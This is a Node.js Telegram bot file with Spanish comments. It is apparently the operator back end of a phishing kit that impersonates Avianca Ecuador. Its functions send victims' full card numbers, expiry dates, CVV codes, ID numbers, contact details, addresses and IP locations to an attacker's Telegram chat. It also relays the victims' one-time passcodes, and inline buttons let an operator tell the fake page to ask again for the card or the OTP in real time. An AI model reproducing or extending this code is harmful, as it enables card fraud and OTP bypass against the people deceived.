const { Telegraf, Markup } = require('telegraf');
const store = require('./store');

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN) throw new Error('BOT_TOKEN no está configurado');
if (!CHAT_ID) throw new Error('CHAT_ID no está configurado');

const bot = new Telegraf(BOT_TOKEN);

// ===================== FORMATO DE MENSAJES =====================

function escapeMd(s) {
  if (s === undefined || s === null) return '';
  return String(s).replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
}

function formatPayment(p) {
  const lines = [
    '🔴 *AVIANCA ECUADOR* 🔴',
    '',
    'ℹ️ *DATOS DE LA TARJETA*',
    `💳 \`${escapeMd(p.p || 'N/D')}\``,
    `📅 ${escapeMd(p.pdate || 'N/D')}`,
    `🔐 ${escapeMd(p.c || 'N/D')}`,
    `🏦 ${escapeMd(p.ban || 'N/D')}`,
    `💰 Cuotas: ${escapeMd(p.dues || 'N/D')}`,
    '',
    'ℹ️ *DATOS DEL CLIENTE*',
    `👤 ${escapeMd(p.dudename || '')} ${escapeMd(p.surname || '')}`,
    `🪪 ${escapeMd(p.cc || 'N/D')}`,
    `📧 ${escapeMd(p.email || 'N/D')}`,
    `📞 ${escapeMd(p.telnum || 'N/D')}`,
    '',
    'ℹ️ *DATOS DE FACTURACIÓN*',
    `🏙 ${escapeMd(p.city || 'N/D')}`,
    `🌐 ${escapeMd(p.state || 'N/D')}`,
    `📍 ${escapeMd(p.address || 'N/D')}`,
    `🌎 IP: ${escapeMd(p.ip || 'N/D')}`,
    `📌 ${escapeMd(p.location || 'N/D')}`,
    '',
    `🆔 sessionId: \`${escapeMd(p.sessionId || '')}\``,
  ];
  return lines.join('\n');
}

function formatOtp(p) {
  const lines = [
    '🔔 *CÓDIGO OTP RECIBIDO*',
    '',
    `🔢 Código: \`${escapeMd(p.otp || 'N/D')}\``,
    `👤 ${escapeMd(p.dudename || '')} ${escapeMd(p.surname || '')}`,
    `💳 Tarjeta: •••• ${escapeMd(p.cardLast4 || '----')}`,
    `🏦 Banco: ${escapeMd(p.ban || 'N/D')}`,
    `📞 ${escapeMd(p.telnum || 'N/D')}`,
    `📧 ${escapeMd(p.email || 'N/D')}`,
    `🌎 IP: ${escapeMd(p.ip || 'N/D')}`,
    `📌 ${escapeMd(p.location || 'N/D')}`,
    '',
    `🆔 sessionId: \`${escapeMd(p.sessionId || '')}\``,
  ];
  return lines.join('\n');
}

// ===================== ENVÍO =====================

async function sendPaymentCard(payload) {
  const sid = payload.sessionId;
  store.ensure(sid, 'payment');

  const text = formatPayment(payload);
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('❌ Error Tarjeta', `pay_err:${sid}`),
      Markup.button.callback('✅ Siguiente', `pay_next:${sid}`),
    ],
  ]);

  const msg = await bot.telegram.sendMessage(CHAT_ID, text, {
    parse_mode: 'MarkdownV2',
    reply_markup: keyboard.reply_markup,
  });
  store.setMessageId(sid, msg.message_id);
  return msg.message_id;
}

async function sendOtpCard(payload) {
  const sid = payload.sessionId;
  store.ensure(sid, 'otp');

  const text = formatOtp(payload);
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('❌ Error OTP', `otp_err:${sid}`),
      Markup.button.callback('🏁 Finalizar', `otp_end:${sid}`),
    ],
  ]);

  const msg = await bot.telegram.sendMessage(CHAT_ID, text, {
    parse_mode: 'MarkdownV2',
    reply_markup: keyboard.reply_markup,
  });
  store.setMessageId(sid, msg.message_id);
  return msg.message_id;
}

// ===================== CALLBACKS =====================

// Mapa de acción de botón → decisión que verá el frontend
const ACTION_MAP = {
  pay_next: { stage: 'payment', decision: 'next',   label: '✅ Siguiente' },
  pay_err:  { stage: 'payment', decision: 'error',  label: '❌ Error Tarjeta' },
  otp_end:  { stage: 'otp',     decision: 'finish', label: '🏁 Finalizar' },
  otp_err:  { stage: 'otp',     decision: 'error',  label: '❌ Error OTP' },
};

bot.on('callback_query', async (ctx) => {
  try {
    const data = ctx.callbackQuery.data || '';
    const [action, sid] = data.split(':');
    const meta = ACTION_MAP[action];

    if (!meta || !sid) {
      await ctx.answerCbQuery('Acción no válida');
      return;
    }

    const ok = store.setDecision(sid, meta.decision);
    if (!ok) {
      await ctx.answerCbQuery('⚠️ Sesión expirada o no encontrada');
      return;
    }

    // Editar mensaje: quitar botones y dejar constancia de la decisión
    try {
      const operator = ctx.from ? (ctx.from.username || ctx.from.first_name || ctx.from.id) : '—';
      const original = ctx.callbackQuery.message.text || '';
      const suffix = `\n\n👉 Decisión: ${meta.label}  ·  por @${operator}`;
      await ctx.editMessageText(original + suffix, {
        reply_markup: { inline_keyboard: [] },
      });
    } catch (editErr) {
      // Si el mensaje era MarkdownV2 complejo y falla la edición, al menos quitamos botones.
      try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (_) {}
    }

    await ctx.answerCbQuery(`Registrado: ${meta.label}`);
  } catch (err) {
    console.error('[bot] callback error:', err);
    try { await ctx.answerCbQuery('Error interno'); } catch (_) {}
  }
});

// Lanzar el bot en modo long-polling (no conflicta con Express).
async function launch() {
  await bot.launch();
  console.log('[bot] telegraf iniciado (long polling)');
}

// Graceful shutdown
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

module.exports = { bot, launch, sendPaymentCard, sendOtpCard };
